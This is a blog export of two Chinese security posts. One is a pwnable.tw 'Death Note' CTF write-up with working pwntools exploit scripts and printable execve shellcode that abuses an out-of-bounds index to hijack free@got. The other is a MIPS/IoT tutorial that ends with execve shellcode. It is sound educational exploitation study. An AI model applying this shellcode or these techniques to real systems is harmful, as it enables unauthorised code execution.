<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>pwnable.tw writeup-Death Note</title>
    <url>/2024/07/27/Death-Note/</url>
    <content><![CDATA[<h2 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h2><ol>
<li><p>认识了三个汇编指令，<br><code>dec</code>：将操作数的值减去<code>1</code>。如，<code>edx</code>的值原来为<code>0x30</code>，执行<code>dec edx</code>后，<code>edx</code>的值变为<code>0x2f</code>。<br><code>inc</code>：将操作数的值加上<code>1</code>。如，<code>eax</code>的值原来为<code>0</code>，执行<code>inc eax</code>后，<code>eax</code>的值变为<code>0x1</code>。</p>
<span id="more"></span>

<p><code>xor</code>：将两个操作数的值进行异或。异或，两个二进制数，对应位异或，同为<code>0</code>，不同为<code>1</code>。</p>
</li>
<li><p>对于<code>32</code>位的寄存器<code>edx</code>，<code>dl</code>是其低<code>8</code>位，即最后<code>1</code>个字节；<code>dh</code>是其高<code>8</code>位，即第<code>1</code>个字节。</p>
</li>
<li><p>对于<code>syscall</code>和<code>int 0x80</code>的不可见字符汇编代码编写，<br><code>syscall</code>的机器码是<code>\x0f\x05</code>，<code>int 0x80</code>的机器码是<code>\xCD\x80</code>。这两个指令都是汇编指令，故其在内存中的存储形式是机器码。也就是说，如果<code>0x08048020</code>这个地址里，存储的数据是<code>0x80cd</code>，便可以理解为地址<code>0x08048020</code>存储着<code>int 0x80</code>这个指令。</p>
</li>
</ol>
<h2 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h2><p>程序没有开<em>pie</em>保护，可能要用到<em>shellcode</em>。程序主要功能是实现<em>chunk</em>的创建，打印，删除。在创建<em>chunk</em>的时候，有一个索引越界漏洞，我们可以通过输入负数，覆盖<em>note</em>数组前面的内容为<em>chunk_hook</em>。</p>
<p>通过以上方法，覆盖<code>free@got.plt</code>，为一个<em>chunk_hook</em>，该<em>chunk_hook</em>指向<em>chunk</em>的<em>user_data</em>。如果我们把<em>shellcode</em>布置在<em>chunk</em>中，那么在删除<em>chunk</em>的时候，便会执行<em>shellcode</em>。</p>
<p>该题考察了关于可见字符<em>shellcode</em>的编写，不能使用<em>mov</em>，<em>syscall</em>，<em>int 0x80</em>等，我便学习用<em>push,pop,dec,inc,xor</em>来编写<code>32</code>位的<em>execve</em>的系统调用。</p>
<h4 id="dec"><a href="#dec" class="headerlink" title="dec"></a><em>dec</em></h4><blockquote>
<p>汇编指令<code>dec</code>是”decrement”的缩写，意思是将操作数的值减去1。在汇编语言中，<code>dec</code>指令通常用于减少寄存器或内存位置中的数值。例如，如果有一个寄存器A的当前值为5，执行<code>dec A</code>后，寄存器A的值将变为4。</p>
<p><code>dec</code>指令可以应用于不同的上下文和数据类型，具体行为可能因使用的CPU架构和汇编语言的变种而有所不同。在一些架构中，<code>dec</code>可能只影响无符号整数，而在其他架构中，它可能适用于有符号整数。使用时需要参考特定处理器的指令集架构（ISA）文档。</p>
</blockquote>
<h4 id="inc"><a href="#inc" class="headerlink" title="inc"></a><em>inc</em></h4><blockquote>
<p>汇编指令<code>inc</code>是”increment”的缩写，意思是将操作数的值增加1。这个指令通常用于寄存器或内存位置中的数值增加操作。</p>
<p>例如，如果有一个寄存器B的当前值为3，执行<code>inc B</code>后，寄存器B的值将变为4。</p>
<p>与<code>dec</code>指令类似，<code>inc</code>的具体行为可能因使用的CPU架构和汇编语言的变种而有所不同。在某些架构中，<code>inc</code>可能只影响无符号整数，而在其他架构中，它可能适用于有符号整数。使用时同样需要参考特定处理器的指令集架构（ISA）文档。</p>
</blockquote>
<h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a><em>shellcode</em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#execve(&quot;/bin/sh&quot;,0,0) eax = 11</span><br><span class="line">#ebx,ecx,edx</span><br><span class="line">/*   将&#x27;/bin//sh&#x27;的地址放到ebx中</span><br><span class="line">push ebx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">push esp</span><br><span class="line">pop ebx</span><br><span class="line">push edx</span><br><span class="line">*/</span><br><span class="line">dec edx   #edx-1</span><br><span class="line">dec edx</span><br><span class="line">xor [eax+36], dl</span><br><span class="line">xor [eax+37], dl</span><br><span class="line">pop edx</span><br><span class="line">/*   eax = 11</span><br><span class="line">push ecx</span><br><span class="line">pop eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax	</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h2><h3 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./death_note&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10201</span>)</span><br><span class="line">debug(p,<span class="number">0x080489EF</span>,<span class="number">0x080489FD</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Name :&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	push ebx</span></span><br><span class="line"><span class="string">	push 0x68732f2f</span></span><br><span class="line"><span class="string">	push 0x6e69622f</span></span><br><span class="line"><span class="string">	push esp</span></span><br><span class="line"><span class="string">	pop ebx</span></span><br><span class="line"><span class="string">    dec ecx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    xor [eax+56],dl</span></span><br><span class="line"><span class="string">    xor [eax+57],dl</span></span><br><span class="line"><span class="string">	pop edi</span></span><br><span class="line"><span class="string">    pop edi</span></span><br><span class="line"><span class="string">	pop eax</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode) + <span class="string">b&#x27;\x3a\x77&#x27;</span></span><br><span class="line">add(-<span class="number">19</span>,shellcode)</span><br><span class="line">delete(-<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./death_note&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10201</span>)</span><br><span class="line">debug(p,<span class="number">0x080489EF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Name :&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	push ebx</span></span><br><span class="line"><span class="string">	push 0x68732f2f</span></span><br><span class="line"><span class="string">	push 0x6e69622f</span></span><br><span class="line"><span class="string">	push esp</span></span><br><span class="line"><span class="string">	pop ebx</span></span><br><span class="line"><span class="string">	push edx</span></span><br><span class="line"><span class="string">	dec edx</span></span><br><span class="line"><span class="string">	dec edx</span></span><br><span class="line"><span class="string">	xor [eax+36], dl</span></span><br><span class="line"><span class="string">	xor [eax+37], dl</span></span><br><span class="line"><span class="string">	pop edx</span></span><br><span class="line"><span class="string">	push ecx</span></span><br><span class="line"><span class="string">	pop eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode) + <span class="string">b&#x27;\x33\x7e&#x27;</span></span><br><span class="line">add(-<span class="number">19</span>,shellcode)</span><br><span class="line">delete(-<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwnable.tw刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>IOT入门之MIPS架构基础知识学习</title>
    <url>/2025/03/03/IOT%E5%85%A5%E9%97%A8%E4%B9%8BMIPS%E6%9E%B6%E6%9E%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>花了几天的时间来学习MIPS，先从调试一段简单的代码开始，看看MIPS汇编指令是怎么进行一系列操作的，然后去了解各个指令的含义和寄存器的用途，遇到不易理解的就在gdb中调试一下，接着就是其函数调用约定及相关特性，最后是编写MIPS汇编的shellcode。学完这些紧接着就去复现漏洞了，也没好好总结一下，复现完漏洞后还是觉得要梳理一下MIPS的相关知识，想了想写篇文章总结是再好不过了，因此又花了不少时间写了下面这些内容。</p>
<span id="more"></span>

<p>学习过程中参考了不少师傅写的文章，大佬们写的都非常好非常感谢，链接放在最后了。本人菜鸟一枚，如有不对请指出，谢谢包容^_^</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>最开始的开始当然是先搭建好环境，搭建交叉编译环境和qemu，调试还要安装gdb-multiarch，这一部分就不细说了，内容不多就下面几条命令。（其实在这一步我已经踩了无数坑😀👍</p>
<h3 id="安装qemu、mips依赖库、gdb-multiarch"><a href="#安装qemu、mips依赖库、gdb-multiarch" class="headerlink" title="安装qemu、mips依赖库、gdb-multiarch"></a>安装qemu、mips依赖库、gdb-multiarch</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install qemu</span><br><span class="line">sudo apt install qemu-user-static binfmt-support qemu-user qemu-system</span><br><span class="line">sudo apt-get install gcc-mips-linux-gnu</span><br><span class="line">sudo apt-get install gcc-mipsel-linux-gnu</span><br><span class="line">sudo apt-get install gcc-mips64-linux-gnuabi64</span><br><span class="line">sudo apt-get install gcc-mips64el-linux-gnuabi64</span><br><span class="line">sudo apt install gdb-multiarch</span><br></pre></td></tr></table></figure>

<h3 id="安装buildroot交叉编译环境"><a href="#安装buildroot交叉编译环境" class="headerlink" title="安装buildroot交叉编译环境"></a>安装buildroot交叉编译环境</h3><p>去<a href="https://buildroot.org/">buildroot.org</a>下载buildroot-2024.02.11.tar.gz</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf buildroot-2019.02.4.tar.gz</span><br><span class="line">make clean</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>

<p>在<code>target options-&gt;target arch</code>选项里面选择自己要编译的架构，这里选择<code>MIPS(Little endian)</code>，代表MIPS小端序。<code>toolchain</code>中还要选择C语言库，这里选<code>uGlibc</code>。</p>
<p>设置环境变量：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export PATH=/home/wen/Desktop/buildroot-2024.02.11/output/host/bin:\$PATH&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>

<h2 id="程序启动调试"><a href="#程序启动调试" class="headerlink" title="程序启动调试"></a>程序启动调试</h2><p>demo.c：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> age = <span class="number">7</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;My age is %d.\n&quot;</span>,age);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上面demo.c程序为例，执行下面指令来启动程序：<br>注：mips和mipsel的区别是前者为大端序，后者为小端序，<code>readelf -h demo</code>可以查看程序的字节序。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#编译</span></span><br><span class="line">mips-linux-gnu-gcc demo.c -o demo -static -g <span class="comment">#-static是静态链接</span></span><br><span class="line"><span class="comment">#运行</span></span><br><span class="line">qemu-mips ./demo   <span class="comment">#（大端序</span></span><br></pre></td></tr></table></figure>

<p>如果要直接调试程序，先执行<code>qemu-mips -g 6666 ./demo</code>，然后在另一个终端，执行下面这几条命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line"><span class="built_in">set</span> architecture mips   <span class="comment">#设置架构为mips</span></span><br><span class="line"><span class="built_in">set</span> endian big   <span class="comment">#设置端序为大端序</span></span><br><span class="line">symbol-file ./demo   <span class="comment">#添加符号表</span></span><br><span class="line">target remote localhost:6666</span><br></pre></td></tr></table></figure>

<p>如下：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503121514052.png" alt="image-20250310092641519" style="zoom:67%;" />

<p>上面这种情况是调试静态链接的程序，如果程序是动态链接的，先执行<code>qemu-mips -g 6666 ./demo</code>，然后执行这几条命令即可。</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">gdb-mutiarch</span><br><span class="line"><span class="keyword">file</span> ./demo</span><br><span class="line"><span class="keyword">target</span> remote localhost:<span class="number">6666</span></span><br></pre></td></tr></table></figure>

<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><h3 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h3><p>MIPS架构中有32个通用寄存器，在汇编程序中可以用编号表示，也可以用寄存器的名称来表示，各个通用寄存器的详细信息如下表所示：</p>
<table>
<thead>
<tr>
<th align="left">编号</th>
<th>名称</th>
<th>描述</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$0</td>
<td>$zero</td>
<td>常量寄存器，值为0</td>
<td></td>
</tr>
<tr>
<td align="left">$1</td>
<td>$at</td>
<td>为汇编器保留的寄存器，主要用于处理伪指令和加载大常数。</td>
<td>Assembler Temporary</td>
</tr>
<tr>
<td align="left">$2~$3</td>
<td>$v0~$v1</td>
<td>存储表达式或函数返回值</td>
<td>Values</td>
</tr>
<tr>
<td align="left">$4~$7</td>
<td>$a0~$a3</td>
<td>函数调用时，用来存储前四个参数</td>
<td>Arguments</td>
</tr>
<tr>
<td align="left">$8~$15</td>
<td>$t0~$t7</td>
<td>临时寄存器，存放临时变量</td>
<td>Temporaries</td>
</tr>
<tr>
<td align="left">$16~$23</td>
<td>$s0~$s7</td>
<td>保存寄存器，用于保存函数调用之间的状态（即寄存器的值）（与$t0~$t9相反）</td>
<td>Saved Values</td>
</tr>
<tr>
<td align="left">$24~$25</td>
<td>$t8~$t9</td>
<td>临时寄存器</td>
<td>Temporaries</td>
</tr>
<tr>
<td align="left">$26~$27</td>
<td>$k0~$k1</td>
<td>用于保存异常处理和中断的返回值，为操作系统<code>Keep</code>使用</td>
<td>Kernel reserved</td>
</tr>
<tr>
<td align="left">$28</td>
<td>$gp</td>
<td>全局指针</td>
<td>Global Pointer</td>
</tr>
<tr>
<td align="left">$29</td>
<td>$sp</td>
<td>堆栈指针，会指向栈顶</td>
<td>Stack Pointer</td>
</tr>
<tr>
<td align="left">$30</td>
<td>$s8&#x2F;$fp</td>
<td>可以作为第九个保存寄存器($s8)，也可以作为栈帧指针($fp)保存栈指针</td>
<td>Saved value &#x2F; Frame Pointer</td>
</tr>
<tr>
<td align="left">$31</td>
<td>$ra</td>
<td>存储函数的返回地址</td>
<td>Return Address</td>
</tr>
</tbody></table>
<h3 id="特殊寄存器"><a href="#特殊寄存器" class="headerlink" title="特殊寄存器"></a>特殊寄存器</h3><p>除了上面32个通用寄存器，MIPS架构还定义了一些特殊用途的寄存器，下面介绍一些特殊寄存器：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>$pc</td>
<td>程序计数器，指向当前执行的指令地址</td>
</tr>
<tr>
<td>$hi</td>
<td>高位寄存器，存储乘除操作的高位结果</td>
</tr>
<tr>
<td>$lo</td>
<td>低位寄存器，存储乘除操作的低位结果</td>
</tr>
<tr>
<td>$status</td>
<td>状态寄存器，控制处理器模式和中断状态</td>
</tr>
<tr>
<td>$cause</td>
<td>原因寄存器，存储异常和中断的原因</td>
</tr>
</tbody></table>
<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>MIPS架构固定4字节指令长度，其汇编指令与x86还是不太一样的，但区别也不大，下面就只介绍一些常见的汇编指令。</p>
<h3 id="基础指令"><a href="#基础指令" class="headerlink" title="基础指令"></a>基础指令</h3><table>
<thead>
<tr>
<th align="left">指令</th>
<th align="left">备注</th>
<th>描述</th>
<th align="left">举例分析</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>li</code></td>
<td align="left">Load Immediate</td>
<td>将立即数存入寄存器</td>
<td align="left"><code>li $a2,2</code>，$a2的值为2</td>
</tr>
<tr>
<td align="left"><code>lui</code></td>
<td align="left"></td>
<td>将立即数(以二进制形式)左移16位后，存入寄存器</td>
<td align="left"><code>lui $t0,0xF</code>，$t0的值为0xF0000</td>
</tr>
<tr>
<td align="left"><code>la</code></td>
<td align="left">Load Address</td>
<td>将地址存入寄存器</td>
<td align="left"><code>la $t9,memset</code>，$t9中为memset函数的地址</td>
</tr>
<tr>
<td align="left"><code>lw</code></td>
<td align="left">Load Word</td>
<td>从内存中加载一个<code>word</code>类型的值到寄存器中</td>
<td align="left"><code>lw $gp,0x170+var_158($sp)</code>，从栈指针$sp偏移 0x170+var_158 的位置，加载一个<code>32</code>位的值到$gp中</td>
</tr>
<tr>
<td align="left"><code>sw</code></td>
<td align="left">Store Word</td>
<td>将一个 32 位的值从寄存器存储到内存中</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>addi</code></td>
<td align="left">Add Immediate</td>
<td>将立即数与寄存器的值相加后，把结果写入另一个寄存器</td>
<td align="left"><code>addi $t,$s,0xF</code>，$t中为$s的值与0xF的和</td>
</tr>
<tr>
<td align="left"><code>addu</code></td>
<td align="left">Add Unsigned</td>
<td>将寄存器的值相加(无符号加法)后，把结果写到寄存器中</td>
<td align="left"><code>addu $v0,$v1,$v0</code></td>
</tr>
<tr>
<td align="left"><code>add</code></td>
<td align="left"></td>
<td>同addu，区别是该指令是有符号加法</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>addiu</code></td>
<td align="left"></td>
<td>同addi，区别是该指令加无符号立即数</td>
<td align="left"></td>
</tr>
</tbody></table>
<h3 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h3><table>
<thead>
<tr>
<th>指令</th>
<th>备注</th>
<th>描述</th>
<th>举例分析</th>
</tr>
</thead>
<tbody><tr>
<td><code>jr</code></td>
<td>Jump Register</td>
<td>无条件跳转到某个寄存器指定的地址</td>
<td></td>
</tr>
<tr>
<td><code>jal</code></td>
<td>Jump and Link</td>
<td>跳转到某个地址，并将返回地址存入<code>$ra</code>寄存器</td>
<td></td>
</tr>
<tr>
<td><code>jalr</code></td>
<td>Jump and Link Register</td>
<td>跳转到某个寄存器指定的地址，并将返回地址存入另一个寄存器</td>
<td><code>jalr $t9</code>跳转到$t9存储的地址，并将返回地址存入$ra</td>
</tr>
<tr>
<td><code>b</code></td>
<td>Branch</td>
<td>无条件跳转指令（标签或地址）</td>
<td></td>
</tr>
<tr>
<td><code>bnez</code></td>
<td>Branch if Not Equal to Zero</td>
<td>指定寄存器的值<strong>不为0</strong>，才跳转</td>
<td><code>bnez $v0,loc_402B24</code>若$v0的值为零则跳转到loc_402B24标签处</td>
</tr>
<tr>
<td><code>beqz</code></td>
<td>Branch if Equal to Zero</td>
<td>指定寄存器的值<strong>为0</strong>，才跳转</td>
<td></td>
</tr>
</tbody></table>
<h2 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h2><h3 id="叶子与非叶子函数"><a href="#叶子与非叶子函数" class="headerlink" title="叶子与非叶子函数"></a>叶子与非叶子函数</h3><p>定义：现有3个函数分别为A、B、C，其中函数A调用函数B，函数B调用函数C，因此A和B为非叶子函数，C为叶子函数。</p>
<p>调用函数C时会将其返回地址直接存入<code>$ra</code>寄存器，执行完函数C后，程序流会直接执行<code>jr $ra</code>指令跳到返回地址（返回函数B）；而对于函数B，在跳转到B时会将其返回地址先存入<code>$ra</code>寄存器，然后在执行函数B的过程中再将<code>$ra</code>的值存入栈中，执行完后，程序流则会先从堆栈中取出被保存在堆栈上的返回地址，放入<code>$ra</code>寄存器中，然后再执行<code>jr $ra</code>指令。</p>
<h3 id="函数传参"><a href="#函数传参" class="headerlink" title="函数传参"></a>函数传参</h3><p>当参数小于等于4个时，使用<code>$a0 ~ $a3</code>寄存器存储；超过4个的部分被放到了栈里。且前4个参数在使用前也会被放入之前在栈中预留的空间中。</p>
<h3 id="栈帧开辟"><a href="#栈帧开辟" class="headerlink" title="栈帧开辟"></a>栈帧开辟</h3><p>调用函数时，MIPS架构下开辟栈帧的方式与x86架构不同，但最后的栈帧结构是相同的。MIPS下的栈帧开辟方式如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">► 0x400614 &lt;main+16&gt;    jal    A &lt;0x4005a4&gt;</span><br><span class="line">   ↓</span><br><span class="line">  0x4005a4 &lt;A&gt;          addiu  $sp, $sp, -0x20   #（1）开辟栈帧空间</span><br><span class="line">  0x4005a8 &lt;A+4&gt;        sw     $ra, 0x1c($sp)    #（2）存储返回地址（调用完函数A后返回到的地址</span><br><span class="line">  0x4005ac &lt;A+8&gt;        sw     $fp, 0x18($sp)    #（3）将$fp放入栈中</span><br><span class="line">  0x4005b0 &lt;A+12&gt;       move   $fp, $sp          #（4）将$sp放入$fp中</span><br></pre></td></tr></table></figure>

<p>等价的x86指令如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call 	main			#这里的作用同上面的（2）</span><br><span class="line">push    ebp				#（3）</span><br><span class="line">mov     ebp, esp		#（4）</span><br><span class="line">sub     esp, 14h		#（1）</span><br></pre></td></tr></table></figure>

<h2 id="mips架构特性"><a href="#mips架构特性" class="headerlink" title="mips架构特性"></a>mips架构特性</h2><p>MIPS架构存在“流水线效应”和“缓存不一致性”这两个特性。</p>
<p>“流水线效应”指的是本应该顺序执行的几条指令会同时执行，这样在执行跳转指令的时候，当刚要跳转到指定地址时，跳转指令的下一条指令也已经执行了，这样的现象称为<strong>分支延迟效应</strong>，跳转指令的下一条指令称为<strong>分支延迟槽</strong>。也因此，MIPS架构下的分支延迟槽通常都是<code>nop</code>指令，当然也不全是。</p>
<p>“缓存不一致性”指的是指令缓存区和数据缓存区两者的同步需要一个时间来同步，比如我们将shellcode写入栈上后，我们需要这块区域已经是指令缓存区，但此时其还属于数据缓存区，若直接跳转过去执行shellcode，就会出现问题，因此，我们<strong>需要调用<code>sleep</code>函数</strong>，先停顿一段时间，给它时间从数据缓存区转成指令缓存区，然后再跳转过去，才能成功执行。</p>
<h2 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h2><p><code>$v0</code>寄存器存储<strong>系统调用号</strong>和<strong>系统调用的返回值</strong>，<code>$a0 ~ $a3</code>寄存器用来存储前4个参数，<code>syscall</code>指令触发系统调用。</p>
<p>先试着自己写一个write的系统调用，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data</span><br><span class="line">some_label: .word 0x61626364</span><br><span class="line">.text</span><br><span class="line">.globl __start</span><br><span class="line">__start:</span><br><span class="line">	.set noreorder</span><br><span class="line">    li $a0,1</span><br><span class="line">    la $a1,some_label</span><br><span class="line">    li $a2,4</span><br><span class="line">    li $v0,4004</span><br><span class="line">    syscall</span><br><span class="line">    li $v0,4001</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>

<p>注意系统调用完write后，还要再执行一个exit系统调用，以防止程序的执行流继续执行后面的指令，而导致出现一系列错误。</p>
<h3 id="execve系统调用"><a href="#execve系统调用" class="headerlink" title="execve系统调用"></a>execve系统调用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data</span><br><span class="line">.text</span><br><span class="line">.globl __start</span><br><span class="line">__start:</span><br><span class="line">	.set noreorder</span><br><span class="line">    addiu $sp,$sp,-0x10</span><br><span class="line">    li $t0,0x2f62696e #/bin</span><br><span class="line">    li $t1,0x2f2f7368 #//sh</span><br><span class="line">    sw $t0,0x8($sp)</span><br><span class="line">    sw $t1,0xc($sp)</span><br><span class="line">    la $a0,0x8($sp)</span><br><span class="line">    addi $a1,$zero,0</span><br><span class="line">    addi $a2,$zero,0</span><br><span class="line">    addi $v0,$zero,4011</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>

<p>上面这段代码需要开辟栈帧，借助栈来传递字符串<code>/bin//sh</code>的地址给<code>$a0</code>寄存器，也可以通过<code>.byte</code>指令将<code>/bin//sh</code>字符串放在自定义的标签中（注意字符串后面要00截断，不然后面可能会带上其他字符），然后直接<code>la</code>标签的地址给<code>$a0</code>寄存器，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data</span><br><span class="line"># /bin//sh\x00</span><br><span class="line">some_label: .byte 0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x00</span><br><span class="line">.text</span><br><span class="line">.globl __start</span><br><span class="line">__start:</span><br><span class="line">	.set noreorder</span><br><span class="line">    la $a0,some_label</span><br><span class="line">    addi $a1,$zero,0</span><br><span class="line">    addi $a2,$zero,0</span><br><span class="line">    addi $v0,$zero,4011</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>

<p>可以借助这个网站<a href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/">Online Assembler and Disassembler</a>，查看汇编代码对应的机器码。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.yuque.com/cyberangel/rg9gdm/yxb067">《IoT从入门到入土》(1)–MIPS交叉编译环境搭建及其32位指令集</a></p>
